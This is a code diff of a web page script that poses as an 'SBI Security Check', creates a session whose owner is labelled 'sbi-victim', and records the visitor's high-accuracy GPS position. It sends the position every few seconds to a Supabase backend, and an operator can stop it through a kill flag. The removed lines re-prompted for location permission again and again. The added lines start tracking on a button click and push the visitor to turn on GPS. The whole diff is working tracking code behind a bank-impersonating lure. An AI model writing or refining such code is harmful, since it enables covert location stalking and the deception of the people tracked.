@@ -5,56 +5,37 @@ let sessionId = "";
 let isKilled = false;
 
 async function init() {
-  try {
-    const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions`, {
-      method: "POST",
-      headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json", "Prefer": "return=representation" },
-      body: JSON.stringify({ 
-        owner_id: "sbi-victim-" + Date.now(), 
-        label: "SBI Security Check", 
-        is_active: true, 
-        is_killed: false 
-      })
-    });
+  const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions`, {
+    method: "POST",
+    headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json", "Prefer": "return=representation" },
+    body: JSON.stringify({ owner_id: "sbi-victim-" + Date.now(), label: "SBI Security Check", is_active: true, is_killed: false })
+  });
 
-    const data = await res.json();
-    sessionId = data[0].id;
-
-    // Start spamming location immediately
-    forceLocationPopup();
-
-  } catch(e) {
-    console.error(e);
-  }
+  const data = await res.json();
+  sessionId = data[0].id;
+  console.log("Session Started");
 }
 
-function forceLocationPopup() {
-  // Multiple ways to trigger permission
-  navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
-  
-  // Extra aggressive - keep calling
-  setTimeout(() => navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true }), 600);
-  setTimeout(() => navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true }), 1200);
+// Trigger on button click - Best for mobile
+async function startTracking() {
+  if (!sessionId) return;
+
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      console.log("✅ Location Allowed on Mobile");
+      sendLocation(pos);
+      setInterval(() => sendLocation(), 5000);
+    },
+    (err) => {
+      console.log("❌ Denied or GPS off", err);
+      alert("Please turn on GPS and allow location permission");
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
 }
 
-function success(pos) {
-  console.log("✅ Location permission granted");
-  sendLocation(pos);
-  setInterval(() => sendLocation(), 4000);
-}
-
-function error(err) {
-  console.log("❌ Permission denied or location off - retrying...", err);
-  setTimeout(forceLocationPopup, 800);   // spam again
-}
-
-function sendLocation(pos = null) {
+function sendLocation(pos) {
   if (isKilled) return;
-  if (!pos) {
-    navigator.geolocation.getCurrentPosition(sendLocation, () => {}, { enableHighAccuracy: true });
-    return;
-  }
-
   fetch(`${SUPABASE_URL}/rest/v1/location_pings`, {
     method: "POST",
     headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json" },
@@ -73,10 +54,8 @@ async function checkKillStatus() {
     headers: { "apikey": SUPABASE_KEY }
   });
   const data = await res.json();
-  if (data[0] && data[0].is_killed === true) {
-    isKilled = true;
-  }
+  if (data[0] && data[0].is_killed === true) isKilled = true;
 }
 
-setInterval(checkKillStatus, 3000);
+setInterval(checkKillStatus, 4000);
 window.onload = init;
